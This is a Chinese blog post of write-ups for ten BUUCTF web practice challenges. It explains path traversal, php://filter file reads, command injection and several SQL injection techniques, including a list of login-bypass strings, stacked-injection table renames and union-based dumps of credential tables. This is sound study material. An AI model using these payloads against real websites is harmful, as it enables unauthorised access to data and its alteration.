        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-HCTF-2018-Warmup"><a href="#1-HCTF-2018-Warmup" class="headerlink" title="1.[HCTF 2018]Warmup"></a>1.[HCTF 2018]Warmup</h2><p>考察：php审计：mb_substr()+mb_strpos()绕过</p><p>打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"source"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"source.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"hint"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//白名单</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//执行给出的file参数值</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span> flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先来介绍下两个函数mb_substr()+mb_strpos()：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置    mb_strpos(    string $haystack,    string $needle,):int// haystack：要被检查的字符串。// needle：要搜索的字符串**mb_substr()** 函数返回字符串的一部分。    mb_substr(    string $str,    int $start,    int $length = NULL,):string//str 必需。从该 string 中提取子字符串。//start 必需。规定在字符串的何处开始。//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾request() //可以以get或者post提交参数include //文件包含,包含并运行文件中的内容$_page . '?' //将$_page后拼接 ? public static function checkFile(&amp;$page)&amp;&amp; emmm::checkFile($_REQUEST['file'])上面这代码表示 将request的file值 传入$page，其实就是将file参数传入到page中&amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> sub <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>    <span class="token function">sub</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>将使 $num 变成 6。这是因为在 sub 函数中变量 $var 指向了和 $num 指向的同一个内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，<strong>就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true</strong>。所以构造payload为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg<span class="token number">2.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">3</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个</span><span class="token number">3.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">253</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true</span>    <span class="token comment">//说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后传入payload就会得到flag啦~</p><p><strong>再补充一下 ./   ../   / 的说明：</strong></p><pre class="line-numbers language-none"><code class="language-none">./ 表示当前目录下../ 表示上一级目录/ 表示根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948708.png" style="zoom:150%;"><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948710.png" style="zoom:150%;"><p>如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为</p><pre class="line-numbers language-none"><code class="language-none">./buuctf练习/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在此目录下，有hello.md，那就表示为：</p><pre class="line-numbers language-none"><code class="language-none">./hello.md 或者 hello.md<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果2.png在上层目录的一个image文件下，那就是：</p><pre class="line-numbers language-none"><code class="language-none">../image/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="2-极客大挑战-2019-EasySQL"><a href="#2-极客大挑战-2019-EasySQL" class="headerlink" title="2.[极客大挑战 2019]EasySQL"></a>2.[极客大挑战 2019]EasySQL</h2><p>根据题目提示是SQL注入，所以先试着判断注入点和引号闭合方式：在username输入：1’，密码随便输：1，出现语法报错：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948711.png"></p><p>则可以知道是单引号闭合，接着开始试试万能密码：1’ or 1=1#     ,则输入后后台语句大致就是：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1 # ' and password='1' ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于#会把后面的都注释掉，所以就等价于：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可知 1=1 是个恒等式，所以就登陆成功了，得到flag~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948712.png"></p><p>下面收集一些万能密码：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">'or'='or''or 1=1--''or 1=1--'or'a'='a"or "a"="a"or"="a'='a ')or('a'='aor 1=1--a'or' 1=1--"or"="a'='a'or''='1 or '1'='1'=11 or '1'='1' or 1=1'OR 1=1%00"or 1=1%00'xoradmin' or 'a'='a 密码随便<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="3-极客大挑战-2019-Havefun"><a href="#3-极客大挑战-2019-Havefun" class="headerlink" title="3.[极客大挑战 2019]Havefun"></a>3.[极客大挑战 2019]Havefun</h2><p>这题还是比较简单的哈，进去之后就是一张可爱的猫猫图，有点乖哈哈，查看网页源代码，发现有一段PHP代码，就是get型参数传入：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948713.png"></p><p>然后构造payload为：<a href="http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86">http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog就可以了</a>~</p><hr><h2 id="4-ACTF2020-新生赛-Include"><a href="#4-ACTF2020-新生赛-Include" class="headerlink" title="4.[ACTF2020 新生赛]Include"></a>4.[ACTF2020 新生赛]Include</h2><p>从题目可以看出来考察的是文件包含，进入题目看到tip，点击，网页进行了跳转，此时发现url为：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948714.png"></p><p>可以看到后面有get型参数file值传入，此时传入参数后回显为这句话，那我们就直接通过==<strong>php://filter伪协议</strong>==读取整个flag.php，构造payload为：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948715.png"></p><p>可以看到有一串base64加密的编码，解密后得到flag：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Can you find out the flag?"</span><span class="token punctuation">;</span><span class="token comment">//flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="5-强网杯-2019-随便注"><a href="#5-强网杯-2019-随便注" class="headerlink" title="5.[强网杯 2019]随便注"></a>5.[强网杯 2019]随便注</h2><p>从题目知应该是SQL注入，进入题目看到有一个输入框，输入 1 ，正常返回，加个<strong>单引号 1’</strong> 返回SQL语句错误，即存在SQL注入</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948716.png"></p><p>然后使用order by 2,order by 3 查看列数，发现<strong>只有两列</strong></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948717.png"></p><p>尝试使用联合查询union select 发现回显语是<strong>select被正则过滤</strong>了</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948718.png"></p><p>emmm,开始大小写、联合注释等绕过waf,但是没得用就很气呦……，后来查了下资料原来是忽略掉的<font color="#FF5E3A" size="4">堆叠注入！</font>，那就开始直接查看表名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show tables; --+//在SQL中，分号（;）是用来表示一条sql语句的结束。堆叠注入就是结束一个sql语句后，会继续执行下一条构造的SQL语句。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948719.png"></p><p>然后对应查看对应的列名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from words; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948720.png"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from `1919810931114514`; --+   //字符串为表名操作时要加反引号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948721.png"></p><p>这里可以看到我们要的flag是在对应的表中，根据第一次输入 1 的结果来看后台的语句应该是:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from words where id = <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们目前最重要的就是从另一个表中获得数据，但是我们只能从 “word” 这个表里取数据，然后看了别人的文章发现还可以<strong>改表的名称</strong>来读flag! 所以，思路就很清晰了：</p><ol><li>更改表的名称。将words改为随便其他的名字比如words1，然后将”1919810931114514”表的名字替换为words</li><li>给新的words表增加一列id</li></ol><p>构造payload为（提醒：<font color="#FF5E3A" size="4"> 字符串为表名操作时要加反引号！！！</font>）：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+//这里使用了rename和alert，具体用法可以查一下，不在正则过滤的范围内//注意一定要使用反引号！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接着再查看下表，其实就已经查出来flag了，啊tql，学到了~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948722.png"></p><p>最后感谢有人复现让我学习：<a href="https://github.com/CTFTraining/qwb_2019_supersqli">https://github.com/CTFTraining/qwb_2019_supersqli</a></p><hr><h2 id="6-SUCTF-2019-EasySQL"><a href="#6-SUCTF-2019-EasySQL" class="headerlink" title="6.[SUCTF 2019]EasySQL"></a>6.[SUCTF 2019]EasySQL</h2><p>这题给我整不会了，刚开始试了联合不行，也没报错，报错注入也没了，布尔、时间也不得行了，又是看别人解题的一次，原来还可以猜后端代码:惊恐:。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select $_GET['query'] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后构造payload为：*,1(或者其他常数)</p><p>我接着自己在本地的test数据库尝试了一下，直接构造：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select 1 from salaries;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042456.png" style="zoom:150%;"><p>确实<strong>直接 select 一个常数会直接新增一个临时的列，并且每一行的数值都是这个常数</strong>，再来说一下这个 || ，在mysql里，<strong>只要 || 前面的成立，后面的便不再执行</strong>，同理，前面的不成立会执行后面的 。如果我们直接构造 :</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042458.png"></p><p>可以看到会报语法错误，所以最终就是大佬的构造方法：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *,1||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042459.png" style="zoom:150%;"><p>可以看到新增加了一列并且这个表中的数据也都显示出来了，大佬们牛批！最后解题拿flag：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042460.png" style="zoom:150%;"><h2 id="7-ACTF2020-新生赛-Exec"><a href="#7-ACTF2020-新生赛-Exec" class="headerlink" title="7.[ACTF2020 新生赛]Exec"></a>7.[ACTF2020 新生赛]Exec</h2><p>考察的是<strong>远程命令执行</strong>，emm我也是第一次做这种题，百度了一下网站的ping漏洞，发现可能存在远程执行命令的漏洞，就开始尝试~</p><p>首先讲几个知识点：</p><ul><li><p><strong>命令连接符</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd1 <span class="token punctuation">;</span> cmd2 <span class="token punctuation">;</span> cmd3         分号 <span class="token punctuation">;</span> 可以进行多条命令的无关联执行，每一条执行结果不会影响其他命令的执行cmd1 <span class="token operator">&amp;&amp;</span> cmd2               左边的command1执行成功<span class="token punctuation">(</span>返回0表示成功<span class="token punctuation">)</span>后，  <span class="token operator">&amp;&amp;</span>  右边的command2才能被执行。cmd1 <span class="token operator">|</span> cmd2                <span class="token operator">|</span> 表示管道，上一条命令的输出，作为下一条命令的输入cmd1 <span class="token operator">||</span> cmd2               <span class="token operator">||</span> 表示上一条命令执行失败后，才执行下一条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>下面开始做题：</p><p>首先<code>ls</code>查看一下当前目录有没有flag文件等，发现没得：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042461.png"></p><p>然后尝试遍历父目录可以看到有flag文件：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042462.png"></p><p>这样直接<code>cat ../../../flag</code>拿到flag:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042463.png"></p><h2 id="8-极客大挑战-2019-Secret-File"><a href="#8-极客大挑战-2019-Secret-File" class="headerlink" title="8.[极客大挑战 2019]Secret File"></a>8.[极客大挑战 2019]Secret File</h2><p>考察的是<strong>伪协议读取文件</strong>，难点就是怎么读到flag.php中的flag。</p><p>进入题目查看源代码发现提示有：/Archive_room.php ，接着点发现有：/action.php ，但是访问直接过去了跳到：/end.php，开始抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145471.png"></p><p>发现有secr3t.php，访问之后看到一段代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token prolog">&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET['file'];    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){        echo "Oh no!";        exit();    }    include($file); //flag放在了flag.php里?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接访问flag.php会出现贱贱的话，看不到flag，看到php代码里有过滤的，先解释下这两个函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">strstr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>搜索字符串在另一字符串中的第一次出现。返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 <span class="token boolean constant">FALSE</span>。 <span class="token function">stristr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>    不区分大小写的strstr（）版本。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到过滤了input、data，是伪协议里的，那就考虑filter读取文件，构造payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回flag.php的源码，解密后看到flag：<code>flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2}</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145473.png"></p><h2 id="9-极客大挑战-2019-LoveSQL"><a href="#9-极客大挑战-2019-LoveSQL" class="headerlink" title="9.[极客大挑战 2019]LoveSQL"></a>9.[极客大挑战 2019]LoveSQL</h2><p>考察联合注入:</p><p>首先在username处输入<code>1'</code>,password输个1，发现语法报错，即存在sql注入。接着先查看一下字段数：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 4 #   报错1' order by 3 #   无报错，说明三个字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后试下联合查询爆破所有数据库：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(schema_name) from information_schema.schemata #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050615.png"></p><p>看到有geek，大概率就是他了，接下来查看表名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050616.png"></p><p>接着试试查看l0ve1ysq1表里的列名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050617.png"></p><p>最后就可以直接拿数据了：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag{fbee60d0-759c-4012-a59b-bc0509fa5431}。</p><h2 id="10-GXYCTF2019-Ping-Ping-Ping"><a href="#10-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="10.[GXYCTF2019]Ping Ping Ping"></a>10.[GXYCTF2019]Ping Ping Ping</h2><p>又是一道命令执行漏洞的题目，不过存在了很多过滤，自己试了多种方法也不得行，看了一个师傅的博客学到了,tql，直接贴链接吧：</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187</a></p><hr><p>刷了十道题咧，哎，还是太菜了，不果慢慢有节奏了，慢慢学吧~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948723.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第一章</title>
      <link href="/posts/myh10002.html"/>
      <url>/posts/myh10002.html</url>
      
